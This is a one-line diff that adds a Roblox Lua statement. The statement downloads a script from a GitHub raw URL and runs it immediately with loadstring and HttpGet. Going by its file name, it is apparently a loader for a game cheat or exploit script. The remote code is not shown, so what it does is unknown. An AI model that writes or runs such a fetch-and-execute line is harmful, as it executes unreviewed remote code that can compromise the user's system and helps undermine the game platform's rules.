@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/upd-command-an-army-spam7-rb5xs2o9jfc3b9.lua"))()
